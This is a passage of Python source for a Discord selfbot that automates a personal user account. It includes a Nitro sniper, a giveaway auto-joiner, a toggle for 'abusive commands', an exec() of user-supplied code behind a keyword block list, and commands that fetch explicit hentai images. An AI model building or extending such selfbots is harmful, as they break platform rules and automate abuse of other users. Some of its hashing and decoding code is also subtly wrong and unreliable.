		print(f"                           {purple('[')}+{purple('] CONNECTED')}")
		print(f"                           {purple('[')}+{purple(']')} {bot.user} | {purple(f'{len(bot.guilds)}')} Servers | {purple(f'{len(bot.user.friends)}')} Friends")
		print(f"                           {purple('[')}+{purple(']')} {newprefix}\n")
		print(f"═══════════════════════════════════════════════════════════════════════════════════════════════════\n")
		printmessage(f"{purple(f'{command_count-custom_command_count}')} commands | {purple(f'{custom_command_count}')} custom commands")
		printmessage(f"{motd}")

		printmessage(f"Prefix changed to {purple(f'{newprefix}')}")
		embed = discord.Embed(title="Prefix", url=titleurlvar(), description=f"New prefix: {newprefix}", color=hexcolorvar())
		embed.set_thumbnail(url=imagevar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=largeimagevar())
		await send(luna, embed)

	@commands.command(name = "themes",
					usage="",
					description = "Themes")
	async def themes(self, luna):
		await luna.message.delete()

		path_to_json = 'data/themes/'
		json_files = [pos_json for pos_json in os.listdir(path_to_json) if pos_json.endswith('.json')]

		with open("config.json", "r") as f:
			config = json.load(f)
		prefix = config.get('prefix')
		themesvar = config.get('theme')

		string = f"{json_files}"
		stringedit = string.replace(',', f"\n{prefix}theme").replace("'", "").replace('[', f"{prefix}theme ").replace(']', "").replace('.json', "")

		cog = self.bot.get_cog('Theme commands')
		commands = cog.get_commands()
		helptext = ""
		for command in commands:
			helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"

		embed = discord.Embed(title="Themes", description=f"{descriptionvar()}```\nCurrent theme     » {(themesvar[:-5])}\n``````\nTheme customization\n\n{prefix}customize        » Theme customization\n``````\nTheme control\n\n{helptext}\n``````\nAvailable themes\n\n{stringedit}```", color=hexcolorvar())
		embed.set_thumbnail(url=imagevar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=largeimagevar())
		await send(luna, embed)

	@commands.command(name = "customize",
					usage="",
					aliases=['customise', 'customization'],
					description = "Theme customization")
	async def customize(self, luna):
		await luna.message.delete()

		with open("config.json", "r") as f:
			config = json.load(f)
		prefix = config.get('prefix')
		themesvar = config.get('theme')
		with open(f"data/themes/{themesvar}") as f:
			customi = json.load(f)
		title = customi.get('title')
		footer = customi.get('footer')
		hexcolor = customi.get('hexcolor')
		author = customi.get('author')

		if title == "":
			title = "None"
		if footer == "":
			footer = "None"
		if hexcolor == "":
			hexcolor = "None"
		if author == "":
			author = "None"

		cog = self.bot.get_cog('Customization commands')
		commands = cog.get_commands()
		helptext1 = ""
		for command in commands:
			helptext1+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"

		cog = self.bot.get_cog('Webhook customisation')
		commands = cog.get_commands()
		helptext2 = ""
		for command in commands:
			helptext2+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"

		cog = self.bot.get_cog('Toast customization')
		commands = cog.get_commands()
		helptext3 = ""
		for command in commands:
			helptext3+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
		
		embed = discord.Embed(title="Customization", description=f"{descriptionvar()}```\nYour current theme settings\n\nTheme             » {title}\nFooter            » {footer}\nColor             » {hexcolor}\nAuthor            » {author}\n``````\nSelfbot theme settings\n\n{helptext1}\n``````\nWebhook theme settings\n\n{helptext2}\n``````\nToast theme settings\n\n{helptext3}\n``````\nNote\n\nIf you want to remove a customization,\nYou can use \"None\" to remove it.\n\nIf you want to set up a random color each time\nyou run a command, you can use \"random\" as hex color.\n\nIf you want to set up your avatar as image\nUse \"avatar\" as value.```", color=hexcolorvar())
		embed.set_thumbnail(url=imagevar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=largeimagevar())
		await send(luna, embed)

	@commands.command(name = "embedmode",
					usage="",
					description = "Switch to embed mode")
	async def embedmode(self, luna):
		await luna.message.delete()

		config_mode("1")
		printmessage(f"Switched to {purple('embed')} mode")

		embed = discord.Embed(title=titlevar(), url=titleurlvar(), description=f"Switched to embed mode.", color=hexcolorvar())
		embed.set_thumbnail(url=imagevar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=largeimagevar())
		await send(luna, embed)

	@commands.command(name = "textmode",
					usage="",
					description = "Switch to text mode")
	async def textmode(self, luna):
		await luna.message.delete()

		config_mode("2")
		printmessage(f"Switched to {purple('text')} mode")

		sent = await luna.send(f"```ini\n[ {titlevar()} ]\n\nSwitched to text mode.\n\n[ {footervar()} ]```")
		await asyncio.sleep(deletetimer())
		await sent.delete()

	@commands.command(name = "indentmode",
					usage="",
					description = "Switch to indent mode")
	async def indentmode(self, luna):
		await luna.message.delete()

		config_mode("3")
		printmessage(f"Switched to {purple('indent')} mode")

		sent = await luna.send(f"> **{titlevar()}**\n> \n> ```Switched to indent mode.``` \n> {footervar()}")
		await asyncio.sleep(deletetimer())
		await sent.delete()

	@commands.command(name = "sniper",
					usage="",
					description = "Sniper settings")
	async def sniper(self, luna):
		await luna.message.delete()

		with open("config.json", "r") as f:
			config = json.load(f)
		prefix = config.get('prefix')

		with open('data/nitro.json') as f:
			data = json.load(f)
		nitro_sniper = data.get('nitrosniper')
		api = data.get('api')

		cog = self.bot.get_cog('Sniper settings')
		commands = cog.get_commands()
		helptext = ""
		for command in commands:
			helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"

		embed = discord.Embed(title="Sniper settings", description=f"{descriptionvar()}```\nYour current settings\n\nNitro Sniper      » {nitro_sniper}\nNitro API         » {api}\n``````\nSettings\n\n{helptext}```", color=hexcolorvar())
		embed.set_thumbnail(url=imagevar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=largeimagevar())
		await send(luna, embed)

	@commands.command(name = "giveaway",
					usage="",
					description = "Giveaway settings")
	async def giveaway(self, luna):
		await luna.message.delete()

		with open("config.json", "r") as f:
			config = json.load(f)
		prefix = config.get('prefix')

		with open('data/giveawayjoiner.json') as f:
			data = json.load(f)
		giveawayjoiner = data.get('giveawayjoiner')
		delay_in_minutes = int(data.get('delay_in_minutes'))
		giveaway_server_joiner = data.get('giveaway_server_joiner')

		cog = self.bot.get_cog('Giveaway settings')
		commands = cog.get_commands()
		helptext = ""
		for command in commands:
			helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"

		embed = discord.Embed(title="Giveaway settings", description=f"{descriptionvar()}```\nYour current settings\n\nGiveaway Joiner   » {giveawayjoiner}\nDelay             » {delay_in_minutes} minute/s\nServer Joiner     » {giveaway_server_joiner}\n``````\n{helptext}```", color=hexcolorvar())
		embed.set_thumbnail(url=imagevar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=largeimagevar())
		await send(luna, embed)

	@commands.command(name = "notifications",
					usage="",
					description = "Toast notifications")
	async def notifications(self, luna):
		await luna.message.delete()
		with open("config.json", "r") as f:
			config = json.load(f)
		prefix = config.get('prefix')
		with open('data/toasts.json') as f:
			notif = json.load(f)
		toasts = notif.get('toasts')
		login = notif.get('login')
		nitro = notif.get('nitro')
		giveaway = notif.get('giveaway')
		privnote = notif.get('privnote')
		selfbot = notif.get('selfbot')
		pings = notif.get('pings')
		ghostpings = notif.get('ghostpings')
		friendevents = notif.get('friendevents')
		guildevents = notif.get('guildevents')
		nickupdates = notif.get('nickupdates')
		protection = notif.get('protection')
		cog = self.bot.get_cog('Toast commands')
		commands = cog.get_commands()
		helptext = ""
		for command in commands:
			helptext+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
		await embed_builder(luna, title="Toast notifications", description=f"{descriptionvar()}```\nToast configuration\n\nToasts            » {toasts}\nLogin toasts      » {login}\nNitro toasts      » {nitro}\nGiveaway toasts   » {giveaway}\nPrivnote toasts   » {privnote}\nSelfbot toasts    » {selfbot}\nPing toasts       » {pings}\nGhostping toasts  » {ghostpings}\nFriendevent toast » {friendevents}\nGuildevent toasts » {guildevents}\nNickname toasts   » {nickupdates}\nProtection toasts » {protection}\n``````\nToast control\n\n{helptext}```")


	@commands.command(name = "errorlog",
					usage="<console/message>",
					description = "Switch errorlog")
	async def errorlog(self, luna, mode:str):
		await luna.message.delete()
		if mode == "message" or mode == "console":
			printmessage(f"Error logging » {purple(f'{mode}')}")
			config_errorlog(mode)
			await embed_builder(luna, description=f"```\nError logging » {mode}```")
		else:
			await mode_error(luna, "message or console")

	@commands.command(name = "deletetimer",
					usage="<seconds>",
					description = "Auto delete timer")
	async def deletetimer(self, luna, seconds:int):
		await luna.message.delete()
		await embed_builder(luna, description=f"```\nAuto delete timer » {seconds} seconds```")
		printmessage(f"Auto delete timer » {purple(f'{seconds} seconds')}")
		config_deletetimer(f"{seconds}")

	@commands.command(name = "afkmessage",
					usage="<text>",
					description = "Change the afk message")
	async def afkmessage(self, luna, *, afkmessage):
		await luna.message.delete()
		await embed_builder(luna, description=f"```\nAFK message » {afkmessage}```")
		printmessage(f"AFK message » {purple(f'{afkmessage}')}")
		config_afkmessage(f"{afkmessage}")

	@commands.command(name = "riskmode",
					usage="<on/off>",
					description = "Enable abusive commands")
	async def riskmode(self, luna, mode:str):
		await luna.message.delete()
		if mode == "on" or mode == "off":
			printmessage(f"Riskmode » {purple(f'{mode}')}")
			config_riskmode(mode)
			await embed_builder(luna, description=f"```\nRiskmode » {mode}```")
		else:
			await mode_error(luna, "on or off")

	@commands.command(name = "selfbotdetection",
					usage="<on/off>",
					description = "Selfbot detection")
	async def selfbotdetection(self, luna, mode:str):
		await luna.message.delete()
		if mode == "on" or mode == "off":
			printmessage(f"Selfbot detection » {purple(f'{mode}')}")
			config_selfbot_detection(mode)
			await embed_builder(luna, description=f"```\nSelfbot detection » {mode}```")
		else:
			await mode_error(luna, "on or off")

	@commands.command(name = "mention",
					usage="<on/off>",
					description = "Mention notification")
	async def mention(self, luna, mode:str):
		await luna.message.delete()
		if mode == "on" or mode == "off":
			printmessage(f"Mention notification » {purple(f'{mode}')}")
			config_mention(mode)
			await embed_builder(luna, description=f"```\nMention notification » {mode}```")
		else:
			await mode_error(luna, "on or off")

	@commands.command(name = "password",
					usage="<new_password>",
					description = "Change password config")
	async def password(self, luna, password:str):
		await luna.message.delete()
		await embed_builder(luna, description=f"```\nChanged password to » {password}```")
		printmessage(f"Changed password to » {purple(f'{password}')}")
		config_password(f"{password}")

	@commands.command(name = "startup",
					usage="<online/idle/dnd/offline>",
					description = "Startup")
	async def startup(self, luna, mode:str):
		await luna.message.delete()
		if mode == "online" or mode == "idle" or mode == "dnd" or mode == "offline":
			printmessage(f"Startup status » {purple(f'{mode}')}")
			config_startupstatus(mode)
			await embed_builder(luna, description=f"```\nStartup status » {mode}```")
		else:
			await mode_error(luna, "online, idle, dnd or offline")

bot.add_cog(SettingsCog(bot))

class ShareCog(commands.Cog, name="Share commands"):
	def __init__(self, bot:commands.bot):
		self.bot = bot
        
	@commands.command(name = "share",
					usage="<on/off>",
					description = "Share on/off")
	async def share(self, luna, mode:str):
		await luna.message.delete()
		if mode == "on" or mode == "off":
			printmessage(f"Share » {purple(f'{mode}')}")
			config_share(mode)
			await embed_builder(luna, description=f"```\nShare » {mode}```")
		else:
			await mode_error(luna, "on or off")

	@commands.command(name = "shareuser",
					usage="<@member>",
					description = "Set the member for sharing")
	async def shareuser(self, luna, user_id):
		await luna.message.delete()
		if "<@!" and ">" in user_id:
			user_id = user_id.replace("<@!", "").replace(">", "")
			user = await self.bot.fetch_user(user_id)
		else:
			user = await self.bot.fetch_user(user_id)
		if user == self.bot.user:
			await error_builder(luna, description=f"```\nYou can't use share on yourself```")
			return
		config_share_userid(user.id)
		printmessage(f"Share user set to » {purple(f'{user}')}")
		await embed_builder(luna, description=f"```\nShare user set to » {user}```")

	@commands.command(name = "sharenone",
					usage="",
					description = "Share member to none")
	async def sharenone(self, luna):
		await luna.message.delete()
		config_share_userid("")
		printmessage(f"Share user set to » None")
		await embed_builder(luna, description=f"```\nShare user set to » None```")

bot.add_cog(ShareCog(bot))

class EncodeCog(commands.Cog, name="Encode commands"):
	def __init__(self, bot:commands.bot):
		self.bot = bot

	@commands.command(name = "encode_cea256", usage = "<key> <text>", description = "cea256")  # Encryption made by Exodus <3 
	async def encode_cea256(self, luna, key, *, text):
		await luna.message.delete()
		if len(key) != 32:
			await luna.send("Invalid key, needs to be 256-bits / 32 Chars in length")
			return
		encoded = Encryption(key).CEA256(text)
		await luna.send(f"{encoded}")

	@commands.command(name = "encode_base64",
					usage="<text>",
					description = "base64")
	async def encode_base64(self, luna, *, text:str):
		await luna.message.delete()
		enc = base64.b64encode('{}'.format(text).encode('ascii'))
		encoded = str(enc)
		encoded = encoded[2:len(encoded)-1]
		await luna.send(f"{encoded}")

	@commands.command(name = "encode_leet",
					usage="<text>",
					description = "leet")
	async def encode_leet(self, luna, *, text:str):
		await luna.message.delete()
		encoded = text.replace('e', '3').replace('a', '4').replace('i', '!').replace('u', '|_|').replace('U', '|_|').replace('E', '3').replace('I', '!').replace('A', '4').replace('o','0').replace('O','0').replace('t','7').replace('T','7').replace('l','1').replace('L','1').replace('k','|<').replace('K','|<').replace('CK','X').replace('ck','x').replace('Ck','X').replace('cK','x')
		await luna.send(f"{encoded}")

	@commands.command(name = "encode_md5",
					usage="<text>",
					description = "md5 (oneway)")
	async def encode_md5(self, luna, *, text:str):
		await luna.message.delete()
		enc = hashlib.md5(text.encode())
		encoded = enc.hexdigest()
		await luna.send(f"{encoded}")

	@commands.command(name = "encode_sha1",
					usage="<text>",
					description = "sha1 (oneway)")
	async def encode_sha1(self, luna, *, text:str):
		await luna.message.delete()
		enc = hashlib.sha1(text.encode())
		encoded = enc.hexdigest()
		await luna.send(f"{encoded}")

	@commands.command(name = "encode_sha224",
					usage="<text>",
					description = "sha224 (oneway)")
	async def encode_sha224(self, luna, *, text:str):
		await luna.message.delete()
		enc = hashlib.sha3_224(text.encode())
		encoded = enc.hexdigest()
		await luna.send(f"{encoded}")

	@commands.command(name = "encode_sha256",
					usage="<text>",
					description = "sha256 (oneway)")
	async def encode_sha256(self, luna, *, text:str):
		await luna.message.delete()
		enc = hashlib.sha3_256(text.encode())
		encoded = enc.hexdigest()
		await luna.send(f"{encoded}")

	@commands.command(name = "encode_sha384",
					usage="<text>",
					description = "sha384 (oneway)")
	async def encode_sha384(self, luna, *, text:str):
		await luna.message.delete()
		enc = hashlib.sha3_384(text.encode())
		encoded = enc.hexdigest()
		await luna.send(f"{encoded}")

	@commands.command(name = "encode_sha512",
					usage="<text>",
					description = "sha512 (oneway)")
	async def encode_sha512(self, luna, *, text:str):
		await luna.message.delete()
		enc = hashlib.sha3_512(text.encode())
		encoded = enc.hexdigest()
		await luna.send(f"{encoded}")

bot.add_cog(EncodeCog(bot))

class DecodeCog(commands.Cog, name="Decode commands"):
	def __init__(self, bot:commands.bot):
		self.bot = bot

	@commands.command(name = "decode_cea256", usage = "<key> <text>", description = "cea256")  # Encryption made by Exodus <3 
	async def decode_cea256(self, luna, key, *, text):
		await luna.message.delete()
		if len(key) != 32:
			await luna.send("Invalid key, needs to be 256-bits / 32 Chars in length")
			return
		try:
			decrypted = Decryption(key).CEA256(text)
		except:
			await luna.send("Decryption failed, make sure the key is correct i")
		else:
			await luna.send(f"{decrypted}")

	@commands.command(name = "decode_base64",
					usage="<text>",
					description = "base64")
	async def decode_base64(self, luna, *, text:str):
		await luna.message.delete()
		dec = base64.b64decode('{}'.format(text).encode('ascii'))
		decoded = str(dec)
		decoded = decoded[2:len(decoded)-1]
		await luna.send(f"{decoded}")

	@commands.command(name = "decode_leet",
					usage="<text>",
					description = "leet")
	async def decode_leet(self, luna, *, text:str):
		await luna.message.delete()
		encoded = text.replace('3', 'e').replace('4', 'a').replace('!', 'i').replace('|_|', 'u').replace('|_|', 'U').replace('3', 'E').replace('!', 'I').replace('4', 'A').replace('0','o').replace('0','O').replace('7','t').replace('7','T').replace('1','l').replace('1','L').replace('|<','k').replace('|<','K').replace('X','CK').replace('x','ck').replace('X','Ck').replace('x','cK')
		await luna.send(f"{encoded}")

bot.add_cog(DecodeCog(bot))

class GiveawayCog(commands.Cog, name="Giveaway settings"):
	def __init__(self, bot:commands.bot):
		self.bot = bot
        
	@commands.command(name = "giveawaysniper",
					usage="<on/off>",
					description = "Giveaway sniper")
	async def giveawaysniper(self, luna, mode:str):
		await luna.message.delete()
		if mode == "on" or mode == "off":
			printmessage(f"Giveaway sniper » {purple(f'{mode}')}")
			config_giveaway_sniperjoiner(mode)
			await embed_builder(luna, description=f"```\nGiveaway sniper » {mode}```")
		else:
			await mode_error(luna, "on or off")

	@commands.command(name = "delay",
					usage="<minutes>",
					description = "Delay in minutes")
	async def delay(self, luna, minute:int):
		await luna.message.delete()
		await embed_builder(luna, description=f"```\nGiveaway joiner delay » {minute} minute/s```")
		printmessage(f"Auto delete timer » {bcolors.LIGHTMAGENTA}{minute} minute/s{bcolors.RESET}")
		config_giveaway_sniperdelay(f"{minute}")

	@commands.command(name = "giveawayserver",
					usage="<on/off>",
					description = "Giveaway server joiner")
	async def giveawayserver(self, luna, mode:str):
		await luna.message.delete()
		if mode == "on" or mode == "off":
			printmessage(f"Server joiner » {purple(f'{mode}')}")
			config_giveaway_sniperjoiner(mode)
			await embed_builder(luna, description=f"```\nServer joiner » {mode}```")
		else:
			await mode_error(luna, "on or off")

bot.add_cog(GiveawayCog(bot))

class CustomCog(commands.Cog, name="Custom commands"):
	def __init__(self, bot:commands.bot):
		self.bot = bot
        
	if file_exist('./data/custom/custom.py'):
		pass
	else:
		createFolder('./data/custom')
		file = open("data/custom/custom.py", "w")
		file.write("# Its as simple as writing commands for cogs! (Note: You need to use \"self\") #")
		file.close()
	try:
		directory = "data\\custom\\custom.py"
		file = open(directory, "r")
		file_data = file.read()
		if "sys.modules" in str(file_data):
			print("Tampering attempt detected.")
			time.sleep(5)
			os._exit(0)
		elif "import main" in str(file_data):
			print("Importing main is not allowed.")
			time.sleep(5)
			os._exit(0)
		elif "import inspect" in str(file_data):
			print("Importing inspect is not allowed.")
			time.sleep(5)
			os._exit(0)
		exec(file_data)
	except Exception as e:
		print(e)

bot.add_cog(CustomCog(bot))

class CryptoCog(commands.Cog, name="Cryptocurrency commands"):
	def __init__(self, bot:commands.bot):
		self.bot = bot
        
	@commands.command(name = "btc",
					usage="",
					description = "Show the current prizes of Bitcoin")
	async def btc(self, luna):
		await luna.message.delete()
		request = requests.get(f'https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD,EUR,GBP,CHF,CAD,AUD,RUB,JPY,CNY,INR,TRY,PLN')
		data = request.json()
		usd = data['USD']
		eur = data['EUR']
		gbp = data['GBP']
		chf = data['CHF']
		cad = data['CAD']
		aud = data['AUD']
		rub = data['RUB']
		jpy = data['JPY']
		cny = data['CNY']
		inr = data['INR']
		pln = data['PLN']
		__try = data['TRY']
		embed = discord.Embed(title="BTC (Bitcoin)", color=hexcolorvar())
		embed.description = f"""```
USD: {usd}
EUR: {eur}
GBP: {gbp}
CHF: {chf}
CAD: {cad}
AUD: {aud}
RUB: {rub}
JPY: {jpy}
CNY: {cny}
INR: {inr}
TRY: {__try}
PLN: {pln}```"""
		embed.set_thumbnail(url=imagevar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=largeimagevar())
		await send(luna, embed)

	@commands.command(name = "eth",
					usage="",
					description = "Show the current prizes of Ethereum")
	async def eth(self, luna):
		await luna.message.delete()
		request = requests.get(f'https://min-api.cryptocompare.com/data/price?fsym=ETH&tsyms=USD,EUR,GBP,CHF,CAD,AUD,RUB,JPY,CNY,INR,TRY,PLN')
		data = request.json()
		usd = data['USD']
		eur = data['EUR']
		gbp = data['GBP']
		chf = data['CHF']
		cad = data['CAD']
		aud = data['AUD']
		rub = data['RUB']
		jpy = data['JPY']
		cny = data['CNY']
		inr = data['INR']
		pln = data['PLN']
		__try = data['TRY']
		embed = discord.Embed(title="ETH (Ethereum)", color=hexcolorvar())
		embed.description = f"""```
USD: {usd}
EUR: {eur}
GBP: {gbp}
CHF: {chf}
CAD: {cad}
AUD: {aud}
RUB: {rub}
JPY: {jpy}
CNY: {cny}
INR: {inr}
TRY: {__try}
PLN: {pln}```"""
		embed.set_thumbnail(url=imagevar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=largeimagevar())
		await send(luna, embed)

	@commands.command(name = "doge",
					usage="",
					description = "Show the current prizes of Dogecoin")
	async def doge(self, luna):
		await luna.message.delete()
		request = requests.get(f'https://min-api.cryptocompare.com/data/price?fsym=DOGE&tsyms=USD,EUR,GBP,CHF,CAD,AUD,RUB,JPY,CNY,INR,TRY,PLN')
		data = request.json()
		usd = data['USD']
		eur = data['EUR']
		gbp = data['GBP']
		chf = data['CHF']
		cad = data['CAD']
		aud = data['AUD']
		rub = data['RUB']
		jpy = data['JPY']
		cny = data['CNY']
		inr = data['INR']
		pln = data['PLN']
		__try = data['TRY']
		embed = discord.Embed(title="DOGE (Dogecoin)", color=hexcolorvar())
		embed.description = f"""```
USD: {usd}
EUR: {eur}
GBP: {gbp}
CHF: {chf}
CAD: {cad}
AUD: {aud}
RUB: {rub}
JPY: {jpy}
CNY: {cny}
INR: {inr}
TRY: {__try}
PLN: {pln}```"""
		embed.set_thumbnail(url=imagevar())
		embed.set_footer(text=footervar(), icon_url=footer_iconurlvar())
		embed.set_author(name=authorvar(), url=authorurlvar(), icon_url=author_iconurlvar())
		embed.set_image(url=largeimagevar())
		await send(luna, embed)

bot.add_cog(CryptoCog(bot))

class CustomizeCog(commands.Cog, name="Customization commands"):
	def __init__(self, bot:commands.bot):
		self.bot = bot
        
	@commands.command(name = "ctitle",
					usage="<title>",
					description = "Customize the title")
	async def ctitle(self, luna, *, newtitle:str):
		await luna.message.delete()
		printmessage(f"Changed title to » {purple(f'{newtitle}')}")
		if newtitle == "None":
			config_theme_title("")
		else:
			config_theme_title(f"{newtitle}")
		await embed_builder(luna, description=f"```\nChanged title to » {newtitle}```")

	@commands.command(name = "ctitleurl",
					usage="<url>",
					description = "Customize the title url")
	async def ctitleurl(self, luna, newtitleurl:str):
		await luna.message.delete()
		if newtitleurl == "None":
			config_theme_titleurl("")
		if not newtitleurl.startswith("https://"):
			await error_builder(luna, description=f"```\nNot a valid URL. Needs to start with \"https://\"```")
			return
		else:
			config_theme_titleurl(f"{newtitleurl}")
		printmessage(f"Changed title url to » {purple(f'{newtitleurl}')}")
		await embed_builder(luna, description=f"```\nChanged title url to » {newtitleurl}```")

	@commands.command(name = "cfooter",
					usage="<footer>",
					description = "Customize the footer")
	async def cfooter(self, luna, *, newfooter:str):
		await luna.message.delete()
		printmessage(f"Changed footer to » {purple(f'{newfooter}')}")
		if newfooter == "None":
			config_theme_footer("")
		else:
			config_theme_footer(f"{newfooter}")
		await embed_builder(luna, description=f"```\nChanged footer to » {newfooter}```")

	@commands.command(name = "cfootericon",
					usage="<url>",
					description = "Customize the footer icon")
	async def cfootericon(self, luna, newfootericonurl:str):
		await luna.message.delete()
		if newfootericonurl == "None":
			config_theme_footer_iconurl("")
		elif newfootericonurl == "avatar":
			config_theme_footer_iconurl("$avatar")
		elif not newfootericonurl.startswith("https://"):
			await error_builder(luna, description=f"```\nNot a valid URL. Needs to start with \"https://\"```")
			return
		else:
			config_theme_footer_iconurl(f"{newfootericonurl}")
		printmessage(f"Changed footer icon url to » {purple(f'{newfootericonurl}')}")
		await embed_builder(luna, description=f"```\nChanged footer icon url to » {newfootericonurl}```")

	@commands.command(name = "cimage",
					usage="<url>",
					description = "Customize the thumbnail image")
	async def cimage(self, luna, newimageurl:str):
		await luna.message.delete()
		if newimageurl == "None":
			config_theme_imageurl("")
		elif newimageurl == "avatar":
			config_theme_imageurl("$avatar")
		elif not newimageurl.startswith("https://"):
			await error_builder(luna, description=f"```\nNot a valid URL. Needs to start with \"https://\"```")
			return
		else:
			config_theme_imageurl(f"{newimageurl}")
		printmessage(f"Changed thumbnail url to » {purple(f'{newimageurl}')}")
		await embed_builder(luna, description=f"```\nChanged thumbnail url to » {newimageurl}```")

	@commands.command(name = "clargeimage",
					usage="<url>",
					description = "Customize the large image")
	async def clargeimage(self, luna, newimageurl:str):
		await luna.message.delete()
		if newimageurl == "None":
			config_theme_largeimageurl("")
		elif not newimageurl.startswith("https://"):
			await error_builder(luna, description=f"```\nNot a valid URL. Needs to start with \"https://\"```")
			return
		else:
			config_theme_largeimageurl(f"{newimageurl}")
		printmessage(f"Changed image url to » {purple(f'{newimageurl}')}")
		await embed_builder(luna, description=f"```\nChanged image url to » {newimageurl}```")

	@commands.command(name = "chexcolor",
					usage="<#hex>",
					description = "Theme hexadecimal color")
	async def chexcolor(self, luna, newhexcolor:str):
		await luna.message.delete()
		if len(newhexcolor) < 6:
			await error_builder(luna, description=f"```\nNot a valid HEX color code```")
			return
		printmessage(f"Changed hexcolor to » {purple(f'newhexcolor')}")
		if newhexcolor == "None":
			config_theme_hexcolor("")
		else:
			config_theme_hexcolor(f"{newhexcolor}")
		await embed_builder(luna, description=f"```\nChanged hexcolor to » {newhexcolor}```")

	@commands.command(name = "cauthor",
					usage="<text>",
					description = "Customize the author text")
	async def cauthor(self, luna, *, newauthor:str):
		await luna.message.delete()
		printmessage(f"Changed author to » {purple(f'newauthor')}'")
		if newauthor == "None":
			config_theme_author("")
		else:
			config_theme_author(f"{newauthor}")
		await embed_builder(luna, description=f"```\nChanged author to » {newauthor}```")

	@commands.command(name = "cauthoricon",
					usage="<url>",
					description = "Customize the author icon")
	async def cauthoricon(self, luna, newauthoriconurl:str):
		await luna.message.delete()
		if newauthoriconurl == "None":
			config_theme_author_iconurl("")
		elif newauthoriconurl == "avatar":
			config_theme_author_iconurl("$avatar")
		elif not newauthoriconurl.startswith("https://"):
			await error_builder(luna, description=f"```\nNot a valid URL. Needs to start with \"https://\"```")
			return
		else:
			config_theme_author_iconurl(f"{newauthoriconurl}")
		printmessage(f"Changed author icon url to » {purple(f'newauthoriconurl')}'")
		await embed_builder(luna, description=f"```\nChanged author icon url to » {newauthoriconurl}```")

	@commands.command(name = "cauthorurl",
					usage="<url>",
					description = "Customize the author url")
	async def cauthorurl(self, luna, newauthorurl:str):
		await luna.message.delete()
		if newauthorurl == "None":
			config_theme_authorurl("")
		elif not newauthorurl.startswith("https://"):
			await error_builder(luna, description=f"```\nNot a valid URL. Needs to start with \"https://\"```")
			return
		else:
			config_theme_authorurl(f"{newauthorurl}")
		printmessage(f"Changed author url to » {purple(f'newauthorurl')}'")
		await embed_builder(luna, description=f"```\nChanged author url to » {newauthorurl}```")

	@commands.command(name = "description",
					aliases=['cdescription'],
					usage="<on/off>",
					description = "Hide/Show <> | []")
	async def description(self, luna, mode:str):
		await luna.message.delete()
		if mode == "on":
			printmessage(f"Changed description to » {purple('on')}")
			config_theme_description(True)
			await embed_builder(luna, description=f"```\nChanged description to » on```")
		elif mode == "off":
			printmessage(f"Changed description to » {purple('off')}")
			config_theme_description(False)
			await embed_builder(luna, description=f"```\nChanged description to » off```")
		else:
			await mode_error(luna, "on or off")

	@commands.command(name = "color",
					usage="<hexcode>",
					description = "Color information")
	async def color(self, luna, hexcode:str):
		await luna.message.delete()
		if hexcode == "random":
			hexcode = "%06x" % random.randint(0, 0xFFFFFF)
		if hexcode[:1] == "#":
			hexcode = hexcode[1:]
		if not re.search(r'^(?:[0-9a-fA-F]{3}){1,2}$', hexcode):
			return
		r = requests.get(f"https://react.flawcra.cc/api/generation.php?type=color&color={hexcode}").json()
		await embed_builder(luna, title=str(r["name"]), description=f"```\nHEX               » {r['hex']}\n``````\nRGB               » {r['rgb']}\n``````\nINT               » {r['int']}\n``````\nBrightness        » {r['brightness']}\n```",color=r["int"], thumbnail=r["image"])

bot.add_cog(CustomizeCog(bot))
class HentaiCog(commands.Cog, name="Hentai commands"):
	def __init__(self, bot:commands.bot):
		self.bot = bot

	@commands.command(name = "hclassic",
					usage="",
					description = "Random classic hentai")
	async def hclassic(self, luna):
		await luna.message.delete()
		r = requests.get("https://nekos.life/api/v2/img/classic").json()
		await embed_builder(luna, large_image=str(r['url']), thumbnail="None")

	@commands.command(name = "hrandom",
					usage="",
					description = "Random hentai gif")
	async def hrandom(self, luna):
		await luna.message.delete()
		r = requests.get("https://nekos.life/api/v2/img/Random_hentai_gif").json()
		await embed_builder(luna, large_image=str(r['url']), thumbnail="None")

	@commands.command(name = "hass",
					usage="",
					description = "Random hentai ass")
	async def hass(self, luna):
		await luna.message.delete()
		r = requests.get("https://nekobot.xyz/api/image?type=hass").json()
		await embed_builder(luna, large_image=str(r['message']), thumbnail="None")

	@commands.command(name = "hboobs",
					usage="",
					description = "Random hentai boobs")
	async def hboobs(self, luna):
		await luna.message.delete()
		r = requests.get("https://nekos.life/api/v2/img/boobs").json()
		await embed_builder(luna, large_image=str(r['url']), thumbnail="None")

	@commands.command(name = "hsmallboobs",
					usage="",
					description = "Random hentai smallboobs")
	async def hsmallboobs(self, luna):
		await luna.message.delete()
		r = requests.get("https://nekos.life/api/v2/img/boobs").json()
		await embed_builder(luna, large_image=str(r['url']), thumbnail="None")

